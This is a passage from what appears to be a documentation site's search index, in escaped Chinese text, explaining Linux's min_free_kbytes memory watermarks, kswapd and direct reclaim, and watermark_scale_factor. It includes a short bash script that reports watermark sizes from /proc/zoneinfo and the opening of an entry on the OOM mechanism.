\u4ec5\u4f9d\u8d56\u7a7a\u95f2\u5185\u5b58\u4f4e\u4e8e\u8fd9\u4e2a\u503c\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u7f13\u51b2\uff0c\u6765\u505a\u5185\u5b58\u56de\u6536\u80af\u5b9a\u662f\u5f88\u4e0d\u9760\u8c31\u7684\uff0c\u5f88\u5bb9\u6613\u88ab\u7a81\u7834\u3002\u56e0\u6b64\u80af\u5b9a\u9700\u8981\u5728min\u4e0a\u52a0\u4e00\u4e2a\u7f13\u51b2\uff0c\u8fd8\u6ca1\u5230min\u7684\u65f6\u5019\u5c31\u9700\u8981\u56de\u6536\uff0c\u56de\u5230\u4e86\u4e00\u5b9a\u7684\u5185\u5b58\u4e4b\u540e\uff0c\u5c31\u4e0d\u5728\u56de\u6536\u4e86\u3002\u8fd9\u91cc\u5c31\u65b0\u589e\u4e86\u4e24\u4e2a\u6570\u51fa\u6765\uff0c\u4e00\u4e2a\u662flow\uff08\u89e6\u53d1\u56de\u6536\uff09\uff0c\u4e00\u4e2a\u662fhigh\uff08\u505c\u6b62\u56de\u6536\uff09\u3002 \u67093\u6761\u865a\u7ebf\uff0c\u4ece\u4e0b\u5230\u4e0a\u5206\u522b\u662fmin/low/high 1\u52302\u7684\u533a\u57df\uff0c\u4e5f\u5c31\u662f\u8fbe\u5230low\u4e4b\u524d\uff0c\u90fd\u4e0d\u4f1a\u89e6\u53d1\u4efb\u4f55\u7684\u5185\u5b58\u56de\u6536\u3002 2\u52303\u7684\u533a\u57df\uff0c\u5728low\u548cmin\u4e4b\u95f4\uff0c\u4efb\u4f55\u7684\u5185\u5b58\u7533\u8bf7\u90fd\u4f1a\u89e6\u53d1kswapd\u540e\u53f0\u56de\u6536\u5185\u5b58\u3002\u77e5\u9053free\u5185\u5b58\u8fbe\u5230high\u505c\u6b62\u56de\u6536\u3002 3\u52304\u7684\u533a\u57df\uff0c\u5c31\u5206\u4e24\u7c7b\u4e86\uff0c\u5c31\u662f\u4e4b\u524d\u63d0\u5230\u76842\u7c7b\uff1a \u90e8\u5206\u7279\u6b8a\u9ad8\u4f18\u5148\u7ea7\u7684\u9700\u6c42\uff0c\u4f1a\u76f4\u63a5\u5360\u7528min\u90e8\u5206\u9884\u7559\u7684\u5185\u5b58\u3002 \u666e\u901a\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u4f1a\u89e6\u53d1direct reclaim\uff0c\u4e5f\u5c31\u662f\u4e1a\u52a1\u8fdb\u7a0b\u76f4\u63a5\u505a\u5185\u5b58\u56de\u6536\uff0c\u7136\u540e\u518d\u6b21\u8bd5\u4e00\u4e0b\u7533\u8bf7\u3002\u8fd9\u79cd\u60c5\u51b5\u5c31\u662f direct reclaim\uff08\u76f4\u63a5\u56de\u6536\uff09\uff08\u963b\u585e\u65b0\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u8fd9\u79cd\u60c5\u51b5\u79f0\u4e3aDirect reclaim\uff09\u3002direct reclaim \u4f1a\u6bd4\u8f83\u6d88\u8017\u65f6\u95f4\u7684\u539f\u56e0\u662f\uff0c\u5982\u679c\u56de\u6536\u7684\u662f dirty page\uff0c\u5c31\u4f1a\u89e6\u53d1\u78c1\u76d8 IO \u7684\u64cd\u4f5c \u5f53\u524d\u7684\u5185\u6838\uff0cmin/low/high\u90fd\u662f\u901a\u8fc7min_free_kbytes\u63a7\u5236\u7684\uff1a min=min_free_kbytes low=min_free_kbytes+min_free_kbytes/4 high=min_free_kbytes+min_free_kbytes/2 \u901a\u5e38\uff0c\u6211\u4eec\u9700\u8981\u8c03\u6574\u8fd9\u4e2a\u53c2\u6570\uff0c\u4e0d\u5916\u4e4e\u5c31\u662f\u4e3a\u4e86\u8fd92\u4e2a\u539f\u56e0\uff1a 1\u3001\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u9884\u7559\u5185\u5b58\u5c11\uff0c\u5c11\u6570\u9ad8\u4f18\u5148\u7ea7\u5185\u5b58\u7533\u8bf7\u5931\u8d25\u5bfc\u81f4\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u3002 2\u3001\u4e1a\u52a1\u7ecf\u5e38\u9047\u5230direct reclaim\u5bfc\u81f4\u5185\u5b58\u7533\u8bf7\u6162\u5bfc\u81f4\u4e1a\u52a1\u6296\u52a8\u3002 \u7cfb\u7edf\u9ed8\u8ba4\u7684min_free_kbytes\u4e00\u822c\u53ea\u6709\u51e0\u5341MB\u3002\u5bf9\u4e8e\u7b2c\u4e00\u70b9\uff0c\u6bd4\u8f83\u7f55\u89c1\u3002\u4ee5\u524d\u662f5u/6u\u7684\u673a\u5668\u4e0a\uff0c\u9047\u5230\u8f83\u591a\uff0c\u4e00\u822c\u90fd\u662f\u7533\u8bf7\u9ad8\u9636\u5185\u5b58\u5931\u8d25\u3002\u9ad8\u9636\u5185\u5b58\u6307\u7684\u662f\u8fde\u7eed\u7684\u7269\u7406\u5185\u5b58\u3002\u6709\u4e0d\u540c\u7684\u9636\u6570\uff0c\u9636\u6570\u8d8a\u9ad8\uff0c\u8fde\u7eed\u7684\u8d8a\u5927\u3002\u57285u/6u\u7684\u5185\u6838\u7531\u4e8e\u6ca1\u6709\u52a8\u6001\u7684\u5185\u5b58\u788e\u7247\u6574\u7406\u529f\u80fd\uff0c\u5bfc\u81f4\u5185\u5b58\u788e\u7247\u5316\u66f4\u52a0\u4e25\u91cd\uff0c\u9ad8\u9636\u5185\u5b58\u7533\u8bf7\u66f4\u5bb9\u6613\u5931\u8d25\u3002 \u57287u\u4e0a\uff0c\u8fd9\u4e2a\u95ee\u9898\u5f97\u5230\u663e\u8457\u7684\u6539\u5584\u3002 \u57287u\u4e0a\uff0c\u8c03\u6574min_free_kbytes\u66f4\u591a\u5f97\u662f\u964d\u4f4edirect reclaim\u7684\u6982\u7387\u3002\u73b0\u5728\u7684\u673a\u5668\uff0c\u5185\u5b58\u8d8a\u6765\u8d8a\u5927\uff0c\u6574\u673a\u6027\u80fd\u8d8a\u6765\u8d8a\u597d\uff0c\u5355\u673a\u8dd1\u7684\u4e1a\u52a1\u8d8a\u6765\u8d8a\u591a\u3002\u6bcf\u6b21\u7a7a\u95f2\u5185\u5b58\u4f4e\u4e8emin\u503c\u65f6\uff0cdirect reclaim\u5bf9\u4e8e\u4e1a\u52a1\u7684\u5f71\u54cd\u4e5f\u8d8a\u6765\u8d8a\u660e\u663e\u3002\u7279\u522b\u662frt\u654f\u611f\u578b\u7684\u4e1a\u52a1\uff0c\u6bd4\u5982DB\uff0c\u5f71\u54cd\u66f4\u662f\u5de8\u5927\u3002 \u800c\u5b9e\u9645\u4e0a\uff0c\u964d\u4f4edirect reclaim\u7684\u6982\u7387\uff0c\u8fd9\u4e2a\u6548\u679c\u4e5f\u4e0d\u662f\u975e\u5e38\u597d\uff0c\u4ece\u524d\u9762\u7684\u5206\u6790\u53ef\u4ee5\u770b\u5230\uff0cfree\u5185\u5b58\u4f4e\u4e8emin\u503c\u4e4b\u540e\uff0c\u7533\u8bf7\u5185\u5b58\u90fd\u4f1a\u89e6\u53d1direct reclaim\u3002\u8c03\u5927\u8fd9\u4e2a\u53c2\u6570\uff0c\u4e5f\u76f4\u63a5\u8ba9\u89e6\u53d1direct reclaim\u7684\u5185\u5b58\u6c34\u4f4d\u70b9\u63d0\u9ad8\u4e86\u3002 \u8fd9\u4e2a\u6548\u679c\u5f88\u4e00\u822c\uff0c\u4e3b\u8981\u7684\u6548\u679c\u6765\u81ea\u4e8e\u6bcf\u6b21\u89e6\u53d1kswapd\u76f4\u63a5\u56de\u6536\u65f6\uff0c\u56de\u6536\u7684\u5185\u5b58\u53d8\u591a\u4e86\u3002\u6bcf\u6b21\u56de\u6536\u5927\u7ea60.5*min_free_kbytes\uff0c\u8bbe\u7f6e\u7684\u8d8a\u5927\uff0c\u56de\u6536\u5f97\u8d8a\u591a\u3002 \u8fd9\u4e2a\u7684\u4ee3\u4ef7\u4e5f\u975e\u5e38\u6602\u8d35\uff0cmin\u4ee5\u4e0b\u7684\u5185\u5b58\u7528\u6237\u6001\u7a0b\u5e8f\u662f\u5b8c\u5168\u4e0d\u53ef\u7528\u7684\u72b6\u6001\u3002\u82b1\u4e86\u5f88\u9ad8\u7684\u4ee3\u4ef7\uff0c\u83b7\u5f97\u5fae\u5c0f\u7684\u6536\u76ca\uff0c\u975e\u5e38\u5f97\u5212\u4e0d\u6765\u3002\u4e14\u95ee\u9898\u4f9d\u65e7\u4e25\u5cfb\u3002 \u672a\u6765\u63d0\u5347\u5185\u5b58\u7684\u4f7f\u7528\u7387\u540e\uff0c\u5185\u5b58\u7684\u6c34\u4f4d\u4f1a\u6025\u5267\u5347\u9ad8\u3002\u4e14\u5355\u673a\u7684\u5185\u5b58\u91cf\u4e5f\u662f\u6301\u7eed\u4e0a\u5347\uff0c\u8fd9\u4e2a\u95ee\u9898\u4e9f\u5f85\u89e3\u51b3\uff01 \u8981\u964d\u4f4edirect reclaim\u7684\u6982\u7387\uff0c\u672c\u8d28\u4e0a\u662f\u9700\u8981\u62c9\u5927low\u548cmin\u7684\u5dee\u503c\uff0c\u63d0\u4f9b\u66f4\u591a\u7684\u7f13\u51b2\u7ed9\u5230kswapd\uff0c\u8ba9\u4e00\u6bb5\u65f6\u95f4\u5185kswapd\u7684\u56de\u6536\u6548\u7387\u8ddf\u5f97\u4e0a\u5185\u5b58\u7533\u8bf7\u7684\u901f\u5ea6\u3002\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2a\u5185\u6838\u53c2\u6570\uff0c\u4e13\u95e8\u63a7\u5236low\u503c\uff0c\u800c\u4e0d\u6d89\u53camin\u503c\u3002\u770b\u4e86\u4e00\u4e0bupstream\u4e0a\u7684\u5185\u6838\uff0c\u53d1\u73b0\uff0c\u8fd9\u4e2a\u53c2\u6570\u5df2\u7ecf\u5b58\u5728\u4e86\u3002\u3002\u3002 https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git/commit/?id=795ae7a0de6b834a0cc202aa55c190ef81496665 \u8fd9\u4e2apatch\u57284.9\u7684\u5185\u6838\u4e2d\u5df2\u7ecf\u5b58\u5728\u3002watermark_scale_factor \u8fd9\u4e2a\u53c2\u6570\u7528\u6765\u63a7\u5236low-min\u7684\u503c\u3002 \u663e\u793a\u5185\u5b58\u6c34\u4f4d\u7ebf\u7684\u811a\u672c pages_low=1.25\u500dpages_min\uff0cpage_high=1.5\u500dpages_min\uff0c\u5f53pages_free < pages_low\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u5185\u5b58\u7684\u56de\u6536\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/min_free_kbytes\u8bbe\u7f6epages_min\u6765\u63a7\u5236kswapd0\u7684\u56de\u6536\u65f6\u673a \u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u811a\u672c\u83b7\u53d6 mymin() { T=min sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done #echo $sum let min=$sum*4/1024 echo \"min=${min} MB\" } mylow() { T=low sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done let low=$sum*4/1024 echo \"low=${low} MB\" } myhigh() { T=high sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done let high=$sum*4/1024 echo \"high=${high} MB\" } mymin mylow myhigh zoneinfo \u663e\u793a\u7684\u5360\u7528\u7684\u9875\u4e2a\u6570\uff0c\u4e00\u4e2a\u9875\u4e3a4K","title":"min_free_kbytes\u53c2\u6570"},{"location":"system/linux/%E5%86%85%E5%AD%98/min_free_kbytes%E5%8F%82%E6%95%B0/#min_free_kbytes","text":"min_free_kbytes\u8fd9\u4e2a\u53c2\u6570\uff0c\u76f8\u4fe1\u5f88\u591a\u540c\u5b66\u90fd\u542c\u8bf4\u8fc7\u3002\u7ed9\u7cfb\u7edf\u9884\u7559\u7684\u6700\u4f4e\u5185\u5b58\u6570\u3002\u4f46\u662f\u8fd9\u4e2a\u8bf4\u6cd5\u592a\u6cdb\u6cdb\u4e86\uff0c\u4e0d\u80fd\u5b8c\u5168\u8bf4\u6e05\u695a\u8fd9\u4e2a\u53c2\u6570\u7684\u5b9e\u9645\u610f\u4e49\u3002 \u5185\u6838\u6709\u4e00\u6574\u5957\u7684\u5185\u5b58\u7ba1\u7406\u7684\u7cfb\u7edf\uff1a \u4e00\u65b9\u9762\u8981\u4fdd\u8bc1\u6027\u80fd\uff08\u8ba9\u7528\u6237\u7533\u8bf7\u5185\u5b58\u5c3d\u53ef\u80fd\u5feb\uff09 \u4e00\u65b9\u9762\u8981\u786e\u4fdd\u7a33\u5b9a\uff08\u7d27\u6025\u65f6\u523b\u6709\u5185\u5b58\u4fdd\u547d\uff09 \u9700\u8981\u5728\u4e24\u8005\u4e4b\u95f4\u505a\u5747\u8861\u3002 \u5185\u5b58\u7533\u8bf7\u65f6\uff0c\u6709\u5f88\u591a\u79cd\u7c7b\u578b\uff0c\u6709\u5404\u79cdflag\u63cf\u8ff0\u5185\u5b58\u7533\u8bf7\u7684\u7b56\u7565\uff0c\u4e3a\u4e86\u66f4\u597d\u5730\u63cf\u8ff0\uff0c\u8fd9\u91cc\u6211\u7b80\u5355\u5c31\u5f52\u4e3a2\u7c7b\uff1a \u53ef\u4ee5\u63a5\u53d7\u7b49\u5f85\uff0c\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u7b49\u5f85\u5185\u5b58\u56de\u6536\uff0c\u76f4\u5230\u7533\u8bf7\u5230\u4e3a\u6b62\u3002 \u4e0d\u53ef\u63a5\u53d7\u7b49\u5f85\uff0c\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u76f4\u63a5\u5931\u8d25\u3002 \u666e\u901a\u7684\u7528\u6237\u6001\u7a0b\u5e8f\u7533\u8bf7\u5185\u5b58\u90fd\u662f\u7b2c\u4e00\u7c7b\uff0c\u5f53\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u53ef\u80fd\u4f1a\u7531\u4e8e\u9700\u8981\u89e6\u53d1\u56de\u6536\u800c\u5bfc\u81f4\u7533\u8bf7\u8fc7\u7a0b\u7684\u65f6\u95f4\u53d8\u957f\u5f71\u54cd\u5230\u6027\u80fd\u3002 \u4e00\u4e9b\u5185\u6838\u6001\u7d27\u6025\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u5e38\u89c1\u7684\u5982\u7f51\u7edc\u6536\u53d1\u5305\u9636\u6bb5\uff0c\u5f88\u591a\u5185\u5b58\u7533\u8bf7\u90fd\u662f\u4e0d\u53ef\u7b49\u5f85\u7684\uff0c\u4e00\u65e6\u5185\u5b58\u4e0d\u8db3\uff0c\u5c31\u62a5\u5931\u8d25\uff0c\u8868\u73b0\u5c31\u53ef\u80fd\u662f\u4e22\u5305\uff0c\u751a\u81f3\u66f4\u52a0\u4e25\u91cd\u3002 \u56e0\u6b64\uff0c\u5185\u6838\u4f1a\u5c3d\u53ef\u80fd\u786e\u4fdd\u4e00\u90e8\u5206\u5185\u5b58\u662f\u7a7a\u95f2\u7684\uff0c\u7ed9\u7b2c\u4e8c\u7c7b\u5185\u5b58\u7533\u8bf7\u4f7f\u7528\u3002\u786e\u4fdd\u6574\u4e2a\u7cfb\u7edf\u7a33\u5b9a\u3002\u8fd9\u90e8\u5206\u5185\u5b58\u5c31\u5c31\u662fmin_free_kbytes\u53c2\u6570\u63a7\u5236\u7684\u3002\u518d\u60f3\u4e00\u4e0b\uff0c\u5c31\u4f1a\u6709\u8fd9\u6837\u7684\u7591\u95ee\uff1a\u5982\u4f55\u505a\u5230\u5c06\u8fd9\u4e48\u591a\u7684\u5185\u5b58\u7a7a\u51fa\u6765\u5462\uff1f\u8fd9\u5c31\u6d89\u53ca\u5230\u5185\u5b58\u7684\u56de\u6536\u7b56\u7565\u3002 \u4ec5\u4f9d\u8d56\u7a7a\u95f2\u5185\u5b58\u4f4e\u4e8e\u8fd9\u4e2a\u503c\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u7f13\u51b2\uff0c\u6765\u505a\u5185\u5b58\u56de\u6536\u80af\u5b9a\u662f\u5f88\u4e0d\u9760\u8c31\u7684\uff0c\u5f88\u5bb9\u6613\u88ab\u7a81\u7834\u3002\u56e0\u6b64\u80af\u5b9a\u9700\u8981\u5728min\u4e0a\u52a0\u4e00\u4e2a\u7f13\u51b2\uff0c\u8fd8\u6ca1\u5230min\u7684\u65f6\u5019\u5c31\u9700\u8981\u56de\u6536\uff0c\u56de\u5230\u4e86\u4e00\u5b9a\u7684\u5185\u5b58\u4e4b\u540e\uff0c\u5c31\u4e0d\u5728\u56de\u6536\u4e86\u3002\u8fd9\u91cc\u5c31\u65b0\u589e\u4e86\u4e24\u4e2a\u6570\u51fa\u6765\uff0c\u4e00\u4e2a\u662flow\uff08\u89e6\u53d1\u56de\u6536\uff09\uff0c\u4e00\u4e2a\u662fhigh\uff08\u505c\u6b62\u56de\u6536\uff09\u3002 \u67093\u6761\u865a\u7ebf\uff0c\u4ece\u4e0b\u5230\u4e0a\u5206\u522b\u662fmin/low/high 1\u52302\u7684\u533a\u57df\uff0c\u4e5f\u5c31\u662f\u8fbe\u5230low\u4e4b\u524d\uff0c\u90fd\u4e0d\u4f1a\u89e6\u53d1\u4efb\u4f55\u7684\u5185\u5b58\u56de\u6536\u3002 2\u52303\u7684\u533a\u57df\uff0c\u5728low\u548cmin\u4e4b\u95f4\uff0c\u4efb\u4f55\u7684\u5185\u5b58\u7533\u8bf7\u90fd\u4f1a\u89e6\u53d1kswapd\u540e\u53f0\u56de\u6536\u5185\u5b58\u3002\u77e5\u9053free\u5185\u5b58\u8fbe\u5230high\u505c\u6b62\u56de\u6536\u3002 3\u52304\u7684\u533a\u57df\uff0c\u5c31\u5206\u4e24\u7c7b\u4e86\uff0c\u5c31\u662f\u4e4b\u524d\u63d0\u5230\u76842\u7c7b\uff1a \u90e8\u5206\u7279\u6b8a\u9ad8\u4f18\u5148\u7ea7\u7684\u9700\u6c42\uff0c\u4f1a\u76f4\u63a5\u5360\u7528min\u90e8\u5206\u9884\u7559\u7684\u5185\u5b58\u3002 \u666e\u901a\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u4f1a\u89e6\u53d1direct reclaim\uff0c\u4e5f\u5c31\u662f\u4e1a\u52a1\u8fdb\u7a0b\u76f4\u63a5\u505a\u5185\u5b58\u56de\u6536\uff0c\u7136\u540e\u518d\u6b21\u8bd5\u4e00\u4e0b\u7533\u8bf7\u3002\u8fd9\u79cd\u60c5\u51b5\u5c31\u662f direct reclaim\uff08\u76f4\u63a5\u56de\u6536\uff09\uff08\u963b\u585e\u65b0\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u8fd9\u79cd\u60c5\u51b5\u79f0\u4e3aDirect reclaim\uff09\u3002direct reclaim \u4f1a\u6bd4\u8f83\u6d88\u8017\u65f6\u95f4\u7684\u539f\u56e0\u662f\uff0c\u5982\u679c\u56de\u6536\u7684\u662f dirty page\uff0c\u5c31\u4f1a\u89e6\u53d1\u78c1\u76d8 IO \u7684\u64cd\u4f5c \u5f53\u524d\u7684\u5185\u6838\uff0cmin/low/high\u90fd\u662f\u901a\u8fc7min_free_kbytes\u63a7\u5236\u7684\uff1a min=min_free_kbytes low=min_free_kbytes+min_free_kbytes/4 high=min_free_kbytes+min_free_kbytes/2 \u901a\u5e38\uff0c\u6211\u4eec\u9700\u8981\u8c03\u6574\u8fd9\u4e2a\u53c2\u6570\uff0c\u4e0d\u5916\u4e4e\u5c31\u662f\u4e3a\u4e86\u8fd92\u4e2a\u539f\u56e0\uff1a 1\u3001\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u9884\u7559\u5185\u5b58\u5c11\uff0c\u5c11\u6570\u9ad8\u4f18\u5148\u7ea7\u5185\u5b58\u7533\u8bf7\u5931\u8d25\u5bfc\u81f4\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u3002 2\u3001\u4e1a\u52a1\u7ecf\u5e38\u9047\u5230direct reclaim\u5bfc\u81f4\u5185\u5b58\u7533\u8bf7\u6162\u5bfc\u81f4\u4e1a\u52a1\u6296\u52a8\u3002 \u7cfb\u7edf\u9ed8\u8ba4\u7684min_free_kbytes\u4e00\u822c\u53ea\u6709\u51e0\u5341MB\u3002\u5bf9\u4e8e\u7b2c\u4e00\u70b9\uff0c\u6bd4\u8f83\u7f55\u89c1\u3002\u4ee5\u524d\u662f5u/6u\u7684\u673a\u5668\u4e0a\uff0c\u9047\u5230\u8f83\u591a\uff0c\u4e00\u822c\u90fd\u662f\u7533\u8bf7\u9ad8\u9636\u5185\u5b58\u5931\u8d25\u3002\u9ad8\u9636\u5185\u5b58\u6307\u7684\u662f\u8fde\u7eed\u7684\u7269\u7406\u5185\u5b58\u3002\u6709\u4e0d\u540c\u7684\u9636\u6570\uff0c\u9636\u6570\u8d8a\u9ad8\uff0c\u8fde\u7eed\u7684\u8d8a\u5927\u3002\u57285u/6u\u7684\u5185\u6838\u7531\u4e8e\u6ca1\u6709\u52a8\u6001\u7684\u5185\u5b58\u788e\u7247\u6574\u7406\u529f\u80fd\uff0c\u5bfc\u81f4\u5185\u5b58\u788e\u7247\u5316\u66f4\u52a0\u4e25\u91cd\uff0c\u9ad8\u9636\u5185\u5b58\u7533\u8bf7\u66f4\u5bb9\u6613\u5931\u8d25\u3002 \u57287u\u4e0a\uff0c\u8fd9\u4e2a\u95ee\u9898\u5f97\u5230\u663e\u8457\u7684\u6539\u5584\u3002 \u57287u\u4e0a\uff0c\u8c03\u6574min_free_kbytes\u66f4\u591a\u5f97\u662f\u964d\u4f4edirect reclaim\u7684\u6982\u7387\u3002\u73b0\u5728\u7684\u673a\u5668\uff0c\u5185\u5b58\u8d8a\u6765\u8d8a\u5927\uff0c\u6574\u673a\u6027\u80fd\u8d8a\u6765\u8d8a\u597d\uff0c\u5355\u673a\u8dd1\u7684\u4e1a\u52a1\u8d8a\u6765\u8d8a\u591a\u3002\u6bcf\u6b21\u7a7a\u95f2\u5185\u5b58\u4f4e\u4e8emin\u503c\u65f6\uff0cdirect reclaim\u5bf9\u4e8e\u4e1a\u52a1\u7684\u5f71\u54cd\u4e5f\u8d8a\u6765\u8d8a\u660e\u663e\u3002\u7279\u522b\u662frt\u654f\u611f\u578b\u7684\u4e1a\u52a1\uff0c\u6bd4\u5982DB\uff0c\u5f71\u54cd\u66f4\u662f\u5de8\u5927\u3002 \u800c\u5b9e\u9645\u4e0a\uff0c\u964d\u4f4edirect reclaim\u7684\u6982\u7387\uff0c\u8fd9\u4e2a\u6548\u679c\u4e5f\u4e0d\u662f\u975e\u5e38\u597d\uff0c\u4ece\u524d\u9762\u7684\u5206\u6790\u53ef\u4ee5\u770b\u5230\uff0cfree\u5185\u5b58\u4f4e\u4e8emin\u503c\u4e4b\u540e\uff0c\u7533\u8bf7\u5185\u5b58\u90fd\u4f1a\u89e6\u53d1direct reclaim\u3002\u8c03\u5927\u8fd9\u4e2a\u53c2\u6570\uff0c\u4e5f\u76f4\u63a5\u8ba9\u89e6\u53d1direct reclaim\u7684\u5185\u5b58\u6c34\u4f4d\u70b9\u63d0\u9ad8\u4e86\u3002 \u8fd9\u4e2a\u6548\u679c\u5f88\u4e00\u822c\uff0c\u4e3b\u8981\u7684\u6548\u679c\u6765\u81ea\u4e8e\u6bcf\u6b21\u89e6\u53d1kswapd\u76f4\u63a5\u56de\u6536\u65f6\uff0c\u56de\u6536\u7684\u5185\u5b58\u53d8\u591a\u4e86\u3002\u6bcf\u6b21\u56de\u6536\u5927\u7ea60.5*min_free_kbytes\uff0c\u8bbe\u7f6e\u7684\u8d8a\u5927\uff0c\u56de\u6536\u5f97\u8d8a\u591a\u3002 \u8fd9\u4e2a\u7684\u4ee3\u4ef7\u4e5f\u975e\u5e38\u6602\u8d35\uff0cmin\u4ee5\u4e0b\u7684\u5185\u5b58\u7528\u6237\u6001\u7a0b\u5e8f\u662f\u5b8c\u5168\u4e0d\u53ef\u7528\u7684\u72b6\u6001\u3002\u82b1\u4e86\u5f88\u9ad8\u7684\u4ee3\u4ef7\uff0c\u83b7\u5f97\u5fae\u5c0f\u7684\u6536\u76ca\uff0c\u975e\u5e38\u5f97\u5212\u4e0d\u6765\u3002\u4e14\u95ee\u9898\u4f9d\u65e7\u4e25\u5cfb\u3002 \u672a\u6765\u63d0\u5347\u5185\u5b58\u7684\u4f7f\u7528\u7387\u540e\uff0c\u5185\u5b58\u7684\u6c34\u4f4d\u4f1a\u6025\u5267\u5347\u9ad8\u3002\u4e14\u5355\u673a\u7684\u5185\u5b58\u91cf\u4e5f\u662f\u6301\u7eed\u4e0a\u5347\uff0c\u8fd9\u4e2a\u95ee\u9898\u4e9f\u5f85\u89e3\u51b3\uff01 \u8981\u964d\u4f4edirect reclaim\u7684\u6982\u7387\uff0c\u672c\u8d28\u4e0a\u662f\u9700\u8981\u62c9\u5927low\u548cmin\u7684\u5dee\u503c\uff0c\u63d0\u4f9b\u66f4\u591a\u7684\u7f13\u51b2\u7ed9\u5230kswapd\uff0c\u8ba9\u4e00\u6bb5\u65f6\u95f4\u5185kswapd\u7684\u56de\u6536\u6548\u7387\u8ddf\u5f97\u4e0a\u5185\u5b58\u7533\u8bf7\u7684\u901f\u5ea6\u3002\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2a\u5185\u6838\u53c2\u6570\uff0c\u4e13\u95e8\u63a7\u5236low\u503c\uff0c\u800c\u4e0d\u6d89\u53camin\u503c\u3002\u770b\u4e86\u4e00\u4e0bupstream\u4e0a\u7684\u5185\u6838\uff0c\u53d1\u73b0\uff0c\u8fd9\u4e2a\u53c2\u6570\u5df2\u7ecf\u5b58\u5728\u4e86\u3002\u3002\u3002 https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git/commit/?id=795ae7a0de6b834a0cc202aa55c190ef81496665 \u8fd9\u4e2apatch\u57284.9\u7684\u5185\u6838\u4e2d\u5df2\u7ecf\u5b58\u5728\u3002watermark_scale_factor \u8fd9\u4e2a\u53c2\u6570\u7528\u6765\u63a7\u5236low-min\u7684\u503c\u3002","title":"min_free_kbytes\u53c2\u6570\u6df1\u5165\u89e3\u6790\u53ca\u4f18\u5316"},{"location":"system/linux/%E5%86%85%E5%AD%98/min_free_kbytes%E5%8F%82%E6%95%B0/#_1","text":"pages_low=1.25\u500dpages_min\uff0cpage_high=1.5\u500dpages_min\uff0c\u5f53pages_free < pages_low\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u5185\u5b58\u7684\u56de\u6536\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/min_free_kbytes\u8bbe\u7f6epages_min\u6765\u63a7\u5236kswapd0\u7684\u56de\u6536\u65f6\u673a \u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u811a\u672c\u83b7\u53d6 mymin() { T=min sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done #echo $sum let min=$sum*4/1024 echo \"min=${min} MB\" } mylow() { T=low sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done let low=$sum*4/1024 echo \"low=${low} MB\" } myhigh() { T=high sum=0 for i in $(cat /proc/zoneinfo | grep $T | awk '{print $NF}'); do let sum=$sum+$i done let high=$sum*4/1024 echo \"high=${high} MB\" } mymin mylow myhigh zoneinfo \u663e\u793a\u7684\u5360\u7528\u7684\u9875\u4e2a\u6570\uff0c\u4e00\u4e2a\u9875\u4e3a4K","title":"\u663e\u793a\u5185\u5b58\u6c34\u4f4d\u7ebf\u7684\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/","text":"Linux OOM\u673a\u5236 OOM(Out Of Memory)\u673a\u5236\u4e3aLinux\u5185\u6838\u4e2d\u4e00\u79cd\u81ea\u6211\u4fdd\u62a4\u673a\u5236\uff0c\u5f53\u7cfb\u7edf\u5206\u914d\u4e0d\u51fa\u5185\u5b58\u65f6(\u89e6\u53d1\u6761\u4ef6)\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u673a\u5236\uff0c\u7531\u7cfb\u7edf\u5728\u5df2\u6709\u8fdb\u7a0b\u4e2d\u6311\u9009\u4e00\u4e2a\u5360\u7528\u5185\u5b58\u8f83\u591a\uff0c\u56de\u6536\u5185\u5b58\u6536\u76ca\u6700\u5927\u7684\u8fdb\u7a0b\u6740\u6389\u6765\u91ca\u653e\u5185\u5b58\u3002 Linux\u4e0b\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u6bd4\u7cfb\u7edf\u53ef\u7528\u5185\u5b58\u66f4\u591a\u7684\u5185\u5b58(\u5982malloc\u51fd\u6570)\uff0c\u8fd9\u4e2a\u7279\u6027\u53ebOvercommit\u3002\u8fd9\u4e48\u505a\u662f\u51fa\u4e8e\u4f18\u5316\u7cfb\u7edf\u7684\u8003\u8651\uff0c\u56e0\u4e3a\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u7533\u8bf7\u4e86\u5185\u5b58\u5c31\u7acb\u523b\u4f7f\u7528\uff0c\u5f53\u4f7f\u7528\u7684\u65f6\u5019\u8bf4\u4e0d\u5b9a\u7cfb\u7edf\u5df2\u7ecf\u56de\u6536\u4e86\u4e00\u4e9b\u5185\u5b58\u8d44\u6e90\u4e86\u3002\u4e0d\u8fc7\u5f53\u9700\u8981\u771f\u6b63\u4f7f\u7528\u5185\u5b58\u8d44\u6e90\u800c\u7cfb\u7edf\u5df2\u7ecf\u6ca1\u6709\u591a\u4f59\u7684\u5185\u5b58\u8d44\